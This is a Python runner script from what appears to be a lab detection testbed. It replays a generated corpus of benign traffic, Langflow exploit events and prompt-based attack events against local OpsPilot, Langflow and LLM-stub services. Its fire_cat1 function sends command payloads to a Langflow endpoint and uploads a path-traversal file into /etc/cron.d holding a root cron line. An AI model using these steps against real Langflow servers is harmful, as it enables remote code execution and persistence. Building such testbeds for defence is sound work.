import json
import os
import pathlib
import sys

import httpx

# 直接执行 runner.py 时，补上相邻模块路径以调用 Cat-1 和内存生成器。
root = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(root / "attack"))
sys.path.insert(0, str(root / "corpus-generator"))

from generate import generate, public_record, trajectory_map

OPSPILOT = os.getenv("OPSPILOT_BASE", "http://localhost:8100")
LANGFLOW = os.getenv("LANGFLOW_BASE", "http://localhost:7860")
LLM_STUB = os.getenv("LLM_STUB_BASE", "http://localhost:8000")


def plan_actions(events: list[dict]) -> list[dict]:
    actions = []
    # 回放动作严格按 t 排序，保证同一 corpus 每次产生相同顺序。
    for event in sorted(events, key=lambda item: item["t"]):
        event_input = event["input"]
        # Cat-1 公开事件保留利用参数，runner 由 exploit 字段识别 Langflow 路径。
        if event_input.get("exploit"):
            actions.append(
                {
                    "instance_id": event["instance_id"],
                    "target": "langflow",
                    "exploit": event["input"]["exploit"],
                    "cmd": event["input"]["cmd"],
                    "headers": {
                        "X-Instance-Id": event["instance_id"],
                        "X-Trace-Id": event["instance_id"],
                        "X-DefenseClaw-Trace-Id": event["instance_id"],
                        "X-DefenseClaw-Session-Id": event["instance_id"],
                    },
                }
            )
        elif event_input.get("source"):
            # Cat-2 公开事件走自然语言 prompt 入口，source 只表示外部输入来源。
            body = {"model": "opspilot-stub", "prompt": event_input["prompt"]}
            if event_input.get("skill"):
                body["skill"] = event_input["skill"]
            actions.append(
                {
                    "instance_id": event["instance_id"],
                    "target": "opspilot-app",
                    "headers": {
                        "X-Instance-Id": event["instance_id"],
                        "X-Trace-Id": event["instance_id"],
                        "X-DefenseClaw-Trace-Id": event["instance_id"],
                        "X-DefenseClaw-Session-Id": event["instance_id"],
                    },
                    "username": event["actor"]["sub"],
                    "body": body,
                }
            )
        else:
            # 普通业务流量只需要 prompt、actor 和实例头即可完成回放。
            actions.append(
                {
                    "instance_id": event["instance_id"],
                    "target": "opspilot-app",
                    "headers": {
                        "X-Instance-Id": event["instance_id"],
                        "X-Trace-Id": event["instance_id"],
                        "X-DefenseClaw-Trace-Id": event["instance_id"],
                        "X-DefenseClaw-Session-Id": event["instance_id"],
                    },
                    "username": event["actor"]["sub"],
                    "body": {"model": "opspilot-stub", "prompt": event_input["prompt"]},
                }
            )
    return actions


def login_token(client: httpx.Client, username: str) -> str:
    # runner 复用 OpsPilot 登录接口，让回放流量带真实 JWT。
    response = client.post(f"{OPSPILOT}/login", json={"username": username})
    response.raise_for_status()
    return response.json()["access_token"]


def fetch_langflow_token(client: httpx.Client) -> str:
    # Langflow AUTO_LOGIN 是先换取前端会话 token，再由后续 API 带 bearer 访问。
    response = client.get(f"{LANGFLOW}/api/v1/auto_login")
    response.raise_for_status()
    return response.json()["access_token"]


def inject_trajectories(trajectories: dict[str, list[dict]]) -> None:
    # 回放前把本轮模型轨迹注入 llm-stub 内存，不再依赖 corpus/trajectories.json。
    response = httpx.post(f"{LLM_STUB}/admin/trajectories", json={"trajectories": trajectories}, timeout=15)
    response.raise_for_status()


def clear_trajectories() -> None:
    # 回放结束后清空 llm-stub 内存，避免剧本轨迹在服务中残留。
    response = httpx.delete(f"{LLM_STUB}/admin/trajectories", timeout=15)
    response.raise_for_status()


def replay_events(events: list[dict], only: str | None = None):
    if only and only != "all":
        events = [event for event in events if event["scenario"] == only]
    # 网络执行只在人工 make replay 时发生，离线测试验证 plan_actions。
    with httpx.Client(timeout=15) as client:
        tokens = {}
        langflow_token = None
        for action in plan_actions(events):
            if action["target"] == "langflow":
                # Cat-1 模拟浏览器自动登录后的真实访问形态，token 在同一次回放中复用。
                langflow_token = langflow_token or fetch_langflow_token(client)
                fire_cat1(client, action, langflow_token)
            else:
                fire_opspilot(client, action, tokens)


def select_events(events: list, only: str | None = None) -> list:
    # 单场景回放时只保留本次要执行的事件，管理轨迹也不混入其他场景。
    if only and only != "all":
        return [event for event in events if event.scenario == only]
    return events


def replay_generated(only: str | None = None, seed: int = 1337, total: int = 5200, malicious_target: int = 80):
    generated = generate(seed, total, malicious_target)
    selected = select_events(generated, only)
    public_events = [public_record(event) for event in selected]

    # trajectories 只进入 llm-stub 内存，finally 保证回放失败时也清理。
    inject_trajectories(trajectory_map(selected))
    try:
        replay_events(public_events, only=None)
    finally:
        clear_trajectories()


def replay(corpus_path: str, only: str | None = None):
    events = [json.loads(line) for line in pathlib.Path(corpus_path).read_text(encoding="utf-8").splitlines()]
    replay_events(events, only=only)


def fire_cat1(client: httpx.Client, action: dict, langflow_token: str):
    from cat1.exploit_0770 import make_payload
    from cat1.exploit_5027 import make_upload

    # Cat-1 直接打 Langflow 漏洞端点，但当前镜像需要 auto_login 换来的 bearer token。
    headers = dict(action.get("headers", {}))
    headers["Authorization"] = f"Bearer {langflow_token}"
    if action["exploit"] == "C1-A":
        req = make_payload(action["cmd"])
        response = client.post(f"{LANGFLOW}{req['path']}", headers=headers, json=req["json"])
    else:
        upload = make_upload(f"/etc/cron.d/{action['instance_id']}", "* * * * * root id")
        # Langflow 会按上传文件名做去重；路径穿越文件名需要 append 模式才能稳定回放多条样本。
        response = client.post(f"{LANGFLOW}{upload['path']}", headers=headers, params={"append": "true"}, files={"file": (upload["filename"], upload["content"])})
    response.raise_for_status()


def fire_opspilot(client: httpx.Client, action: dict, tokens: dict):
    username = action["username"]
    # 同一用户 token 缓存复用，避免回放里产生不必要登录噪声。
    tokens.setdefault(username, login_token(client, username))
    headers = dict(action.get("headers", {}))
    headers["Authorization"] = f"Bearer {tokens[username]}"
    body = action["body"]
    response = client.post(f"{OPSPILOT}/run", headers=headers, json=body)
    if response.status_code == 401:
        # A long full replay can outlive the JWT lifetime; refresh once so
        # expiry is not misclassified as a business failure.
        tokens[username] = login_token(client, username)
        headers["Authorization"] = f"Bearer {tokens[username]}"
        response = client.post(f"{OPSPILOT}/run", headers=headers, json=body)
    response.raise_for_status()


if __name__ == "__main__":
    import sys

    replay_generated(only=sys.argv[1] if len(sys.argv) > 1 else None)
